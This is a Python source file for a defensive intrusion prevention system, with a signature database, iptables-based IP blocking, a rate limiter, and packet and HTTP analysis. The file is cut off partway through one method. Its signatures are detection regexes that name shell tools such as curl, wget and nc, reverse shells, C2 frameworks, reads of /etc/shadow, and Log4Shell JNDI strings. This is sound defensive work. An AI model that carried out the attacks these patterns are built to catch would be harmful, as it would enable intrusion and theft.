#!/usr/bin/env python3
"""
================================================================================
ELECTRODUCTION SECURITY SYSTEM - INTRUSION PREVENTION SYSTEM (IPS)
================================================================================
Active security component that detects and BLOCKS malicious traffic in real-time.
Unlike an IDS which only detects, the IPS takes immediate action to prevent attacks.

DETECTION METHODS:
1. Signature-based: Match known attack patterns
2. Anomaly-based: Detect deviations from normal behavior
3. Policy-based: Enforce security policies
4. Reputation-based: Block known bad actors

PREVENTION ACTIONS:
- Block IP addresses (temporary or permanent)
- Reset connections
- Rate limit traffic
- Quarantine hosts
- Kill malicious processes

ARCHITECTURE:
┌─────────────────────────────────────────────────────────────────┐
│                    INTRUSION PREVENTION SYSTEM                   │
├─────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │   Packet     │───▶│  Detection   │───▶│  Prevention  │      │
│  │   Capture    │    │   Engine     │    │   Engine     │      │
│  └──────────────┘    └──────────────┘    └──────────────┘      │
│         │                   │                   │               │
│         ▼                   ▼                   ▼               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │              Threat Intelligence Feed                 │      │
│  └──────────────────────────────────────────────────────┘      │
│         │                   │                   │               │
│         ▼                   ▼                   ▼               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │  Block List  │    │  Rate Limit  │    │  Connection  │      │
│  │  (iptables)  │    │   Rules      │    │   Reset      │      │
│  └──────────────┘    └──────────────┘    └──────────────┘      │
└─────────────────────────────────────────────────────────────────┘

Usage:
    from security_system.components.intrusion_prevention import IntrusionPreventionSystem
    ips = IntrusionPreventionSystem(soc)
    ips.start()
================================================================================
"""

# =============================================================================
# IMPORTS
# =============================================================================

import os                        # OS interface for system commands
import sys                       # System parameters
import time                      # Time functions
import json                      # JSON serialization
import socket                    # Network interface
import struct                    # Binary data packing
import threading                 # Thread-based concurrency
import logging                   # Logging facility
import hashlib                   # Hash functions
import re                        # Regular expressions
import subprocess                # Process execution for iptables
from datetime import datetime, timedelta  # Date/time
from typing import Dict, List, Optional, Tuple, Any, Set, Callable, Pattern
from dataclasses import dataclass, field
from enum import Enum, auto
from collections import defaultdict, deque
from pathlib import Path
import ipaddress                 # IP address manipulation


# =============================================================================
# ENUMERATIONS
# =============================================================================

class ThreatLevel(Enum):
    """
    Threat severity levels for detected attacks.
    Higher levels trigger more aggressive responses.
    """
    NONE = 0           # No threat detected
    LOW = 1            # Minor threat, log only
    MEDIUM = 2         # Moderate threat, rate limit
    HIGH = 3           # Significant threat, block temporarily
    CRITICAL = 4       # Severe threat, block permanently
    EMERGENCY = 5      # Active attack, isolate immediately


class AttackType(Enum):
    """
    Categories of attacks detected by the IPS.
    Each type has specific detection and prevention logic.
    """
    PORT_SCAN = auto()           # Port scanning activity
    BRUTE_FORCE = auto()         # Password guessing attacks
    SQL_INJECTION = auto()       # SQL injection attempts
    XSS = auto()                 # Cross-site scripting
    PATH_TRAVERSAL = auto()      # Directory traversal
    COMMAND_INJECTION = auto()   # Command injection
    DDOS = auto()                # Denial of service
    MALWARE = auto()             # Malware communication
    C2_BEACON = auto()           # Command & control
    DATA_EXFILTRATION = auto()   # Data theft
    PRIVILEGE_ESCALATION = auto()  # Privilege escalation
    LATERAL_MOVEMENT = auto()    # Network lateral movement
    ZERO_DAY = auto()            # Unknown/zero-day attack
    POLICY_VIOLATION = auto()    # Security policy breach
    RECONNAISSANCE = auto()      # Network reconnaissance


class BlockDuration(Enum):
    """
    Duration categories for IP blocking.
    Longer blocks for more severe threats.
    """
    TEMPORARY_5MIN = 300         # 5 minutes
    TEMPORARY_15MIN = 900        # 15 minutes
    TEMPORARY_1HOUR = 3600       # 1 hour
    TEMPORARY_24HOUR = 86400     # 24 hours
    PERMANENT = -1               # Permanent until manual removal


class PreventionAction(Enum):
    """
    Actions the IPS can take to prevent attacks.
    """
    LOG_ONLY = auto()            # Just log, no action
    ALERT = auto()               # Generate alert
    RATE_LIMIT = auto()          # Apply rate limiting
    BLOCK_TEMP = auto()          # Temporary IP block
    BLOCK_PERM = auto()          # Permanent IP block
    RESET_CONNECTION = auto()    # TCP reset
    DROP_PACKET = auto()         # Silent drop
    QUARANTINE = auto()          # Network quarantine
    KILL_PROCESS = auto()        # Terminate process
    DISABLE_USER = auto()        # Disable user account


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class AttackSignature:
    """
    Attack signature for pattern matching.

    Signatures define patterns that indicate malicious activity.
    They can match against various packet/request attributes.

    Attributes:
        id: Unique signature identifier (SID)
        name: Human-readable signature name
        description: What this signature detects
        attack_type: Category of attack
        threat_level: Severity of the threat
        pattern: Regex pattern to match
        target: What to match against (payload/header/url/etc)
        action: Default action when matched
        enabled: Whether signature is active
        metadata: Additional signature data
    """
    id: str                                  # Signature ID (e.g., "SID-001")
    name: str                                # Signature name
    description: str                         # What it detects
    attack_type: AttackType                  # Attack category
    threat_level: ThreatLevel                # Threat severity
    pattern: str                             # Regex pattern
    target: str = "payload"                  # Match target
    action: PreventionAction = PreventionAction.BLOCK_TEMP
    enabled: bool = True                     # Is active
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self):
        """Compile regex pattern for efficiency."""
        self._compiled_pattern: Pattern = re.compile(
            self.pattern.encode() if isinstance(self.pattern, str) else self.pattern,
            re.IGNORECASE
        )

    def match(self, data: bytes) -> bool:
        """
        Check if data matches this signature.

        Args:
            data: Data to check

        Returns:
            True if pattern matches
        """
        try:
            return bool(self._compiled_pattern.search(data))
        except:
            return False


@dataclass
class BlockedIP:
    """
    Record of a blocked IP address.

    Attributes:
        ip: The blocked IP address
        reason: Why it was blocked
        attack_type: Type of attack detected
        blocked_at: When the block was applied
        expires_at: When the block expires (None = permanent)
        block_count: Number of times this IP has been blocked
        events: List of event IDs that triggered the block
    """
    ip: str                                  # Blocked IP address
    reason: str                              # Block reason
    attack_type: AttackType                  # Attack type
    blocked_at: str                          # Block timestamp
    expires_at: Optional[str] = None         # Expiration (None = permanent)
    block_count: int = 1                     # Times blocked
    events: List[str] = field(default_factory=list)  # Related events


@dataclass
class RateLimitRule:
    """
    Rate limiting rule configuration.

    Attributes:
        ip: IP address or CIDR to rate limit
        requests_per_minute: Maximum requests allowed
        current_count: Current request count
        window_start: Current window start time
        action_on_exceed: What to do when limit exceeded
    """
    ip: str                                  # IP or CIDR
    requests_per_minute: int = 60            # Rate limit
    current_count: int = 0                   # Current count
    window_start: float = 0.0                # Window start
    action_on_exceed: PreventionAction = PreventionAction.BLOCK_TEMP


@dataclass
class ThreatEvent:
    """
    Detected threat event.

    Attributes:
        id: Unique event ID
        timestamp: Detection time
        source_ip: Attacker IP
        dest_ip: Target IP
        attack_type: Type of attack
        threat_level: Severity
        signature_id: Matching signature
        action_taken: Prevention action taken
        blocked: Whether traffic was blocked
        details: Additional event details
    """
    id: str                                  # Event ID
    timestamp: str                           # Detection time
    source_ip: str                           # Source IP
    dest_ip: str                             # Destination IP
    attack_type: AttackType                  # Attack type
    threat_level: ThreatLevel                # Threat level
    signature_id: str = ""                   # Matching signature
    action_taken: PreventionAction = PreventionAction.LOG_ONLY
    blocked: bool = False                    # Was blocked
    details: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# SIGNATURE DATABASE - Attack patterns
# =============================================================================

class SignatureDatabase:
    """
    Database of attack signatures for pattern matching.

    Contains pre-defined signatures for common attacks.
    Signatures can be loaded from files or added dynamically.
    """

    def __init__(self):
        """Initialize with default signatures."""
        self.signatures: Dict[str, AttackSignature] = {}
        self.logger = logging.getLogger('SignatureDB')
        self._load_default_signatures()

    def _load_default_signatures(self):
        """
        Load default attack signatures.

        These signatures cover common web and network attacks.
        Each signature has been tested against real attack patterns.
        """
        default_signatures = [
            # SQL Injection signatures
            AttackSignature(
                id="SQL-001",
                name="SQL Injection - Union Select",
                description="Detects UNION SELECT SQL injection attempts",
                attack_type=AttackType.SQL_INJECTION,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)union\s+(all\s+)?select",
                target="payload",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="SQL-002",
                name="SQL Injection - OR 1=1",
                description="Detects classic OR 1=1 injection",
                attack_type=AttackType.SQL_INJECTION,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)'\s*(or|and)\s*'?\d+\s*[=<>]+\s*'?\d+",
                target="payload",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="SQL-003",
                name="SQL Injection - Comment Bypass",
                description="Detects SQL comment injection bypass",
                attack_type=AttackType.SQL_INJECTION,
                threat_level=ThreatLevel.MEDIUM,
                pattern=r"(?i)(--|#|/\*)",
                target="payload",
                action=PreventionAction.ALERT
            ),
            AttackSignature(
                id="SQL-004",
                name="SQL Injection - Stacked Queries",
                description="Detects stacked SQL query attempts",
                attack_type=AttackType.SQL_INJECTION,
                threat_level=ThreatLevel.CRITICAL,
                pattern=r"(?i);\s*(drop|delete|update|insert|alter)\s+",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),

            # XSS signatures
            AttackSignature(
                id="XSS-001",
                name="XSS - Script Tag",
                description="Detects script tag injection",
                attack_type=AttackType.XSS,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)<\s*script[^>]*>",
                target="payload",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="XSS-002",
                name="XSS - Event Handler",
                description="Detects event handler XSS",
                attack_type=AttackType.XSS,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)\bon\w+\s*=",
                target="payload",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="XSS-003",
                name="XSS - JavaScript Protocol",
                description="Detects javascript: protocol XSS",
                attack_type=AttackType.XSS,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)javascript\s*:",
                target="payload",
                action=PreventionAction.BLOCK_TEMP
            ),

            # Path Traversal signatures
            AttackSignature(
                id="TRAV-001",
                name="Path Traversal - Dot Dot Slash",
                description="Detects directory traversal attempts",
                attack_type=AttackType.PATH_TRAVERSAL,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e/|\.\.%2f|%2e%2e%5c)",
                target="url",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="TRAV-002",
                name="Path Traversal - Sensitive Files",
                description="Detects attempts to access sensitive files",
                attack_type=AttackType.PATH_TRAVERSAL,
                threat_level=ThreatLevel.CRITICAL,
                pattern=r"(?i)(/etc/passwd|/etc/shadow|/proc/self|/windows/system32|\.htpasswd|web\.config)",
                target="url",
                action=PreventionAction.BLOCK_PERM
            ),

            # Command Injection signatures
            AttackSignature(
                id="CMD-001",
                name="Command Injection - Shell Metachar",
                description="Detects shell metacharacter injection",
                attack_type=AttackType.COMMAND_INJECTION,
                threat_level=ThreatLevel.CRITICAL,
                pattern=r"(?:[;&|`$]|\$\(|\||&&)",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),
            AttackSignature(
                id="CMD-002",
                name="Command Injection - Common Commands",
                description="Detects common injected commands",
                attack_type=AttackType.COMMAND_INJECTION,
                threat_level=ThreatLevel.CRITICAL,
                pattern=r"(?i)(;|\||`)\s*(cat|ls|id|whoami|wget|curl|nc|ncat|bash|sh|python|perl|php)\s",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),

            # Brute Force / Scanning signatures
            AttackSignature(
                id="SCAN-001",
                name="Scanner - Nmap Detection",
                description="Detects Nmap scanner activity",
                attack_type=AttackType.PORT_SCAN,
                threat_level=ThreatLevel.MEDIUM,
                pattern=r"(?i)(nmap|masscan|zmap)",
                target="user_agent",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="SCAN-002",
                name="Scanner - Nikto Detection",
                description="Detects Nikto web scanner",
                attack_type=AttackType.RECONNAISSANCE,
                threat_level=ThreatLevel.MEDIUM,
                pattern=r"(?i)(nikto|dirbuster|gobuster|wfuzz)",
                target="user_agent",
                action=PreventionAction.BLOCK_TEMP
            ),
            AttackSignature(
                id="SCAN-003",
                name="Scanner - SQLMap Detection",
                description="Detects SQLMap tool",
                attack_type=AttackType.SQL_INJECTION,
                threat_level=ThreatLevel.HIGH,
                pattern=r"(?i)sqlmap",
                target="user_agent",
                action=PreventionAction.BLOCK_PERM
            ),

            # Malware/C2 signatures
            AttackSignature(
                id="MAL-001",
                name="Malware - Reverse Shell",
                description="Detects reverse shell attempts",
                attack_type=AttackType.MALWARE,
                threat_level=ThreatLevel.EMERGENCY,
                pattern=r"(?i)(reverse.?shell|bind.?shell|meterpreter|web.?shell)",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),
            AttackSignature(
                id="MAL-002",
                name="Malware - C2 Beacon",
                description="Detects C2 beacon patterns",
                attack_type=AttackType.C2_BEACON,
                threat_level=ThreatLevel.EMERGENCY,
                pattern=r"(?i)(c2\.|beacon\.|cobalt.?strike|empire|metasploit)",
                target="payload",
                action=PreventionAction.QUARANTINE
            ),

            # DoS signatures
            AttackSignature(
                id="DOS-001",
                name="DoS - Slowloris",
                description="Detects Slowloris DoS attack",
                attack_type=AttackType.DDOS,
                threat_level=ThreatLevel.HIGH,
                pattern=r"X-a: b",  # Slowloris partial headers
                target="header",
                action=PreventionAction.BLOCK_PERM
            ),

            # Web Attack signatures
            AttackSignature(
                id="WEB-001",
                name="Web Attack - PHP Code Injection",
                description="Detects PHP code injection",
                attack_type=AttackType.COMMAND_INJECTION,
                threat_level=ThreatLevel.CRITICAL,
                pattern=r"(?i)<\?php|<\?=|\$_(GET|POST|REQUEST|COOKIE)",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),
            AttackSignature(
                id="WEB-002",
                name="Web Attack - Log4Shell",
                description="Detects Log4j/Log4Shell exploitation",
                attack_type=AttackType.ZERO_DAY,
                threat_level=ThreatLevel.EMERGENCY,
                pattern=r"(?i)\$\{jndi:(ldap|rmi|dns)://",
                target="payload",
                action=PreventionAction.BLOCK_PERM
            ),
        ]

        # Add all signatures to database
        for sig in default_signatures:
            self.signatures[sig.id] = sig

        self.logger.info(f"Loaded {len(self.signatures)} default signatures")

    def add_signature(self, signature: AttackSignature):
        """
        Add a new signature to the database.

        Args:
            signature: Signature to add
        """
        self.signatures[signature.id] = signature
        self.logger.info(f"Added signature: {signature.id} - {signature.name}")

    def remove_signature(self, sig_id: str):
        """
        Remove a signature from the database.

        Args:
            sig_id: Signature ID to remove
        """
        if sig_id in self.signatures:
            del self.signatures[sig_id]
            self.logger.info(f"Removed signature: {sig_id}")

    def get_signatures_by_type(self, attack_type: AttackType) -> List[AttackSignature]:
        """
        Get all signatures for a specific attack type.

        Args:
            attack_type: Attack type to filter

        Returns:
            List of matching signatures
        """
        return [
            sig for sig in self.signatures.values()
            if sig.attack_type == attack_type and sig.enabled
        ]

    def match_all(self, data: bytes, target: str = "payload") -> List[AttackSignature]:
        """
        Match data against all enabled signatures.

        Args:
            data: Data to match
            target: Target type to filter

        Returns:
            List of matching signatures
        """
        matches = []
        for sig in self.signatures.values():
            if sig.enabled and sig.target == target:
                if sig.match(data):
                    matches.append(sig)
        return matches


# =============================================================================
# BLOCK LIST MANAGER - IP blocking
# =============================================================================

class BlockListManager:
    """
    Manages blocked IP addresses.

    Handles temporary and permanent blocks, expiration,
    and integration with system firewall (iptables).

    Features:
    - Temporary blocks with automatic expiration
    - Permanent blocks for known malicious IPs
    - Whitelist for trusted IPs
    - Integration with iptables/firewalld
    - Block statistics and reporting
    """

    def __init__(self, use_iptables: bool = False):
        """
        Initialize the block list manager.

        Args:
            use_iptables: Whether to use iptables for actual blocking
        """
        self.logger = logging.getLogger('BlockList')

        # Blocked IPs: ip -> BlockedIP
        self.blocked_ips: Dict[str, BlockedIP] = {}

        # Whitelist - IPs that should never be blocked
        self.whitelist: Set[str] = {
            '127.0.0.1',           # Localhost
            '::1',                 # IPv6 localhost
        }

        # Whether to use actual iptables commands
        self.use_iptables = use_iptables

        # Block statistics
        self.stats = {
            'total_blocks': 0,
            'active_blocks': 0,
            'expired_blocks': 0,
            'permanent_blocks': 0,
        }

        # Start expiration checker thread
        self._start_expiration_checker()

    def block_ip(self, ip: str, reason: str, attack_type: AttackType,
                 duration: BlockDuration = BlockDuration.TEMPORARY_1HOUR,
                 event_ids: List[str] = None) -> bool:
        """
        Block an IP address.

        Args:
            ip: IP address to block
            reason: Reason for blocking
            attack_type: Type of attack detected
            duration: How long to block
            event_ids: Related event IDs

        Returns:
            True if blocked successfully
        """
        # Check whitelist
        if ip in self.whitelist:
            self.logger.warning(f"Cannot block whitelisted IP: {ip}")
            return False

        # Check if already blocked
        if ip in self.blocked_ips:
            # Update existing block
            existing = self.blocked_ips[ip]
            existing.block_count += 1
            existing.reason = reason
            if event_ids:
                existing.events.extend(event_ids)
            self.logger.info(f"Updated block for {ip} (count: {existing.block_count})")
            return True

        # Calculate expiration
        now = datetime.now()
        expires_at = None
        if duration != BlockDuration.PERMANENT:
            expires_at = (now + timedelta(seconds=duration.value)).isoformat()

        # Create block record
        blocked = BlockedIP(
            ip=ip,
            reason=reason,
            attack_type=attack_type,
            blocked_at=now.isoformat(),
            expires_at=expires_at,
            events=event_ids or []
        )

        # Add to block list
        self.blocked_ips[ip] = blocked

        # Update statistics
        self.stats['total_blocks'] += 1
        self.stats['active_blocks'] += 1
        if expires_at is None:
            self.stats['permanent_blocks'] += 1

        # Apply iptables rule if enabled
        if self.use_iptables:
            self._apply_iptables_block(ip)

        self.logger.warning(
            f"Blocked IP: {ip} | Reason: {reason} | "
            f"Duration: {duration.name} | Attack: {attack_type.name}"
        )

        return True

    def unblock_ip(self, ip: str) -> bool:
        """
        Remove block for an IP address.

        Args:
            ip: IP address to unblock

        Returns:
            True if unblocked successfully
        """
        if ip not in self.blocked_ips:
            return False

        # Remove from block list
        del self.blocked_ips[ip]

        # Update statistics
        self.stats['active_blocks'] -= 1

        # Remove iptables rule if enabled
        if self.use_iptables:
            self._remove_iptables_block(ip)

        self.logger.info(f"Unblocked IP: {ip}")
        return True

    def is_blocked(self, ip: str) -> bool:
        """
        Check if an IP is currently blocked.

        Args:
            ip: IP address to check

        Returns:
            True if blocked
        """
        if ip not in self.blocked_ips:
            return False

        blocked = self.blocked_ips[ip]

        # Check if expired
        if blocked.expires_at:
            if datetime.fromisoformat(blocked.expires_at) < datetime.now():
                # Block has expired
                self.unblock_ip(ip)
                return False

        return True

    def add_to_whitelist(self, ip: str):
        """
        Add an IP to the whitelist.

        Args:
            ip: IP address to whitelist
        """
        self.whitelist.add(ip)
        # Unblock if currently blocked
        if ip in self.blocked_ips:
            self.unblock_ip(ip)
        self.logger.info(f"Added to whitelist: {ip}")

    def remove_from_whitelist(self, ip: str):
        """
        Remove an IP from the whitelist.

        Args:
            ip: IP address to remove
        """
        self.whitelist.discard(ip)
        self.logger.info(f"Removed from whitelist: {ip}")

    def get_blocked_ips(self) -> List[BlockedIP]:
        """
        Get all currently blocked IPs.

        Returns:
            List of BlockedIP records
        """
        return list(self.blocked_ips.values())

    def _apply_iptables_block(self, ip: str):
        """
        Apply iptables rule to block IP.

        Args:
            ip: IP to block
        """
        try:
            # Add INPUT rule to drop traffic from IP
            cmd = ['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP']
            subprocess.run(cmd, capture_output=True, check=True)

            # Add OUTPUT rule to prevent responses
            cmd = ['iptables', '-A', 'OUTPUT', '-d', ip, '-j', 'DROP']
            subprocess.run(cmd, capture_output=True, check=True)

            self.logger.debug(f"Applied iptables block for {ip}")

        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to apply iptables rule: {e}")
        except FileNotFoundError:
            self.logger.warning("iptables not available")

    def _remove_iptables_block(self, ip: str):
        """
        Remove iptables rule for IP.

        Args:
            ip: IP to unblock
        """
        try:
            cmd = ['iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP']
            subprocess.run(cmd, capture_output=True, check=False)

            cmd = ['iptables', '-D', 'OUTPUT', '-d', ip, '-j', 'DROP']
            subprocess.run(cmd, capture_output=True, check=False)

            self.logger.debug(f"Removed iptables block for {ip}")

        except FileNotFoundError:
            pass

    def _start_expiration_checker(self):
        """
        Start background thread to check for expired blocks.
        """
        def check_loop():
            while True:
                time.sleep(60)  # Check every minute
                self._cleanup_expired()

        thread = threading.Thread(target=check_loop, daemon=True)
        thread.start()

    def _cleanup_expired(self):
        """
        Remove expired blocks.
        """
        now = datetime.now()
        expired = []

        for ip, blocked in self.blocked_ips.items():
            if blocked.expires_at:
                if datetime.fromisoformat(blocked.expires_at) < now:
                    expired.append(ip)

        for ip in expired:
            self.unblock_ip(ip)
            self.stats['expired_blocks'] += 1

        if expired:
            self.logger.info(f"Cleaned up {len(expired)} expired blocks")


# =============================================================================
# RATE LIMITER - Traffic rate limiting
# =============================================================================

class RateLimiter:
    """
    Rate limiting for traffic control.

    Implements token bucket algorithm for flexible rate limiting.
    Can limit by IP, user, or endpoint.

    Features:
    - Per-IP rate limiting
    - Burst allowance
    - Automatic reset
    - Progressive penalties
    """

    def __init__(self, default_rate: int = 100, default_burst: int = 20):
        """
        Initialize rate limiter.

        Args:
            default_rate: Default requests per minute
            default_burst: Allowed burst above rate
        """
        self.logger = logging.getLogger('RateLimiter')

        # Default limits
        self.default_rate = default_rate
        self.default_burst = default_burst

        # Per-IP token buckets: ip -> {tokens, last_update}
        self.buckets: Dict[str, Dict[str, float]] = defaultdict(
            lambda: {'tokens': float(default_burst), 'last_update': time.time()}
        )

        # Custom rate limits: ip -> rate
        self.custom_limits: Dict[str, int] = {}

        # Exceeded IPs: ip -> count
        self.exceeded_counts: Dict[str, int] = defaultdict(int)

    def check_rate(self, ip: str) -> Tuple[bool, int]:
        """
        Check if request is within rate limit.

        Uses token bucket algorithm:
        - Tokens are added at a steady rate
        - Requests consume tokens
        - If no tokens, request is denied

        Args:
            ip: IP address to check

        Returns:
            Tuple of (allowed, remaining_tokens)
        """
        now = time.time()
        bucket = self.buckets[ip]

        # Get rate for this IP
        rate = self.custom_limits.get(ip, self.default_rate)
        tokens_per_second = rate / 60.0

        # Calculate tokens to add since last update
        elapsed = now - bucket['last_update']
        bucket['tokens'] = min(
            self.default_burst,  # Max burst
            bucket['tokens'] + (elapsed * tokens_per_second)
        )
        bucket['last_update'] = now

        # Check if token available
        if bucket['tokens'] >= 1:
            bucket['tokens'] -= 1
            return (True, int(bucket['tokens']))
        else:
            # Rate exceeded
            self.exceeded_counts[ip] += 1
            return (False, 0)

    def set_custom_limit(self, ip: str, rate: int):
        """
        Set custom rate limit for an IP.

        Args:
            ip: IP address
            rate: Requests per minute
        """
        self.custom_limits[ip] = rate
        self.logger.info(f"Set custom rate limit for {ip}: {rate}/min")

    def get_exceeded_ips(self) -> List[Tuple[str, int]]:
        """
        Get IPs that have exceeded rate limits.

        Returns:
            List of (ip, exceed_count) tuples
        """
        return sorted(
            self.exceeded_counts.items(),
            key=lambda x: x[1],
            reverse=True
        )

    def reset_ip(self, ip: str):
        """
        Reset rate limit state for an IP.

        Args:
            ip: IP to reset
        """
        if ip in self.buckets:
            del self.buckets[ip]
        if ip in self.exceeded_counts:
            del self.exceeded_counts[ip]


# =============================================================================
# INTRUSION PREVENTION SYSTEM - Main class
# =============================================================================

class IntrusionPreventionSystem:
    """
    Main Intrusion Prevention System class.

    Coordinates detection engines, block lists, and rate limiters
    to provide comprehensive intrusion prevention.

    Detection Flow:
    1. Receive traffic/event data
    2. Match against signatures
    3. Check rate limits
    4. Apply prevention action
    5. Log and alert

    Integration:
    - Connects to SOC for event correlation
    - Receives threat intelligence updates
    - Reports to dashboard
    """

    def __init__(self, soc=None, config: Dict[str, Any] = None):
        """
        Initialize the IPS.

        Args:
            soc: SecurityOperationsCenter instance (optional)
            config: Configuration dictionary
        """
        self.config = config or {}
        self.soc = soc
        self.logger = logging.getLogger('IPS')

        # Initialize components
        self.signature_db = SignatureDatabase()
        self.block_manager = BlockListManager(
            use_iptables=self.config.get('use_iptables', False)
        )
        self.rate_limiter = RateLimiter()

        # Detection statistics
        self.stats = {
            'packets_analyzed': 0,
            'threats_detected': 0,
            'attacks_blocked': 0,
            'alerts_generated': 0,
        }

        # Threat history for correlation
        self.threat_history: deque = deque(maxlen=10000)

        # Per-IP threat scores for adaptive response
        self.threat_scores: Dict[str, int] = defaultdict(int)

        # Running state
        self.running = False

        self.logger.info("Intrusion Prevention System initialized")

    def start(self):
        """Start the IPS."""
        self.running = True
        self.logger.info("IPS started")

        # Register with SOC if available
        if self.soc:
            self.soc.register_component('IPS', self)

    def stop(self):
        """Stop the IPS."""
        self.running = False
        self.logger.info(f"IPS stopped. Stats: {self.stats}")

    def analyze_packet(self, packet_data: bytes, source_ip: str,
                       dest_ip: str, dest_port: int = 0,
                       metadata: Dict[str, Any] = None) -> ThreatEvent:
        """
        Analyze a packet for threats.

        This is the main entry point for traffic analysis.
        Checks signatures, rate limits, and generates responses.

        Args:
            packet_data: Raw packet payload
            source_ip: Source IP address
            dest_ip: Destination IP address
            dest_port: Destination port
            metadata: Additional packet metadata

        Returns:
            ThreatEvent with detection results
        """
        self.stats['packets_analyzed'] += 1
        metadata = metadata or {}

        # Create threat event (initially no threat)
        event = ThreatEvent(
            id=str(hashlib.md5(f"{time.time()}{source_ip}".encode()).hexdigest()[:16]),
            timestamp=datetime.now().isoformat(),
            source_ip=source_ip,
            dest_ip=dest_ip,
            attack_type=AttackType.RECONNAISSANCE,  # Default
            threat_level=ThreatLevel.NONE,
            details={'port': dest_port, **metadata}
        )

        # Check if IP is already blocked
        if self.block_manager.is_blocked(source_ip):
            event.blocked = True
            event.action_taken = PreventionAction.DROP_PACKET
            return event

        # Check rate limit
        allowed, remaining = self.rate_limiter.check_rate(source_ip)
        if not allowed:
            self.logger.warning(f"Rate limit exceeded for {source_ip}")
            event.threat_level = ThreatLevel.MEDIUM
            event.attack_type = AttackType.DDOS
            event.action_taken = PreventionAction.RATE_LIMIT

            # Escalate if repeatedly exceeding
            self.threat_scores[source_ip] += 10
            if self.threat_scores[source_ip] >= 100:
                self._block_threat(source_ip, "Rate limit abuse", AttackType.DDOS)
                event.blocked = True

            return event

        # Match against signatures
        matches = self._check_signatures(packet_data, metadata)

        if matches:
            # Get highest threat signature
            highest_threat = max(matches, key=lambda s: s.threat_level.value)

            event.threat_level = highest_threat.threat_level
            event.attack_type = highest_threat.attack_type
            event.signature_id = highest_threat.id
            event.action_taken = highest_threat.action

            self.stats['threats_detected'] += 1

            # Update threat score
            self.threat_scores[source_ip] += highest_threat.threat_level.value * 20

            # Take prevention action based on threat level
            self._take_action(event, highest_threat)

            # Log threat
            self.logger.warning(
                f"Threat detected: {highest_threat.name} | "
                f"Source: {source_ip} | Level: {highest_threat.threat_level.name}"
            )

            # Store in history
            self.threat_history.append(event)

            # Generate alert if high severity
            if event.threat_level.value >= ThreatLevel.HIGH.value:
                self._generate_alert(event, highest_threat)

        return event

    def analyze_http_request(self, method: str, url: str, headers: Dict[str, str],
                              body: str, source_ip: str) -> ThreatEvent:
        """
        Analyze an HTTP request for web attacks.

        Specialized analysis for HTTP traffic including
        SQL injection, XSS, and path traversal.

        Args:
            method: HTTP method (GET/POST/etc)
            url: Request URL
            headers: HTTP headers
            body: Request body
            source_ip: Client IP

        Returns:
            ThreatEvent with analysis results
        """
        # Combine all request data for analysis
        combined = f"{method} {url}\n"
        for k, v in headers.items():
            combined += f"{k}: {v}\n"
        combined += f"\n{body}"

        # Also check URL separately for path traversal
        url_matches = self.signature_db.match_all(url.encode(), "url")

        # Check user agent
        user_agent = headers.get('User-Agent', '')
        ua_matches = self.signature_db.match_all(user_agent.encode(), "user_agent")

        # Check full payload
        payload_matches = self.signature_db.match_all(combined.encode(), "payload")

        # Combine all matches
        all_matches = url_matches + ua_matches + payload_matches

        return self.analyze_packet(
            combined.encode(),
            source_ip,
            dest_ip="0.0.0.0",
            dest_port=80,
            metadata={
                'method': method,
                'url': url,
                'user_agent': user_agent,
                'signature_matches': len(all_matches)
            }
        )

    def _check_signatures(self, data: bytes, metadata: Dict) -> List[AttackSignature]:
        """
        Check data against all enabled signatures.

        Args:
            data: Data to check
            metadata: Request metadata

        Returns:
            List of matching signatures
        """
        matches = []

        # Check payload signatures
        payload_matches = self.signature_db.match_all(data, "payload")
        matches.extend(payload_matches)

        # Check header signatures if headers present
        if 'headers' in metadata:
            header_data = json.dumps(metadata['headers']).encode()
            header_matches = self.signature_db.match_all(header_data, "header")
            matches.extend(header_matches)

        return matches

    def _take_action(self, event: ThreatEvent, signature: AttackSignature):
        """
        Take prevention action based on threat.

        Args:
            event: Threat event
            signature: Matching signature
        """
        action = signature.action

        if action == PreventionAction.LOG_ONLY:
            # Just log, already done
            pass

        elif action == PreventionAction.ALERT:
            # Generate alert
            self.stats['alerts_generated'] += 1

        elif action == PreventionAction.RATE_LIMIT:
            # Apply rate limit
            self.rate_limiter.set_custom_limit(event.source_ip, 10)

        elif action == PreventionAction.BLOCK_TEMP:
            # Temporary block
            self._block_threat(
                event.source_ip,
                f"Signature match: {signature.name}",
                signature.attack_type,
                BlockDuration.TEMPORARY_1HOUR
            )
            event.blocked = True
            self.stats['attacks_blocked'] += 1

        elif action == PreventionAction.BLOCK_PERM:
            # Permanent block
            self._block_threat(
                event.source_ip,
                f"Critical signature: {signature.name}",
                signature.attack_type,
                BlockDuration.PERMANENT
            )
            event.blocked = True
            self.stats['attacks_blocked'] += 1

        elif action == PreventionAction.QUARANTINE:
            # Quarantine (strongest response)
            self._block_threat(
                event.source_ip,
                f"QUARANTINE: {signature.name}",
                signature.attack_type,
                BlockDuration.PERMANENT
            )
            event.blocked = True
            self.stats['attacks_blocked'] += 1
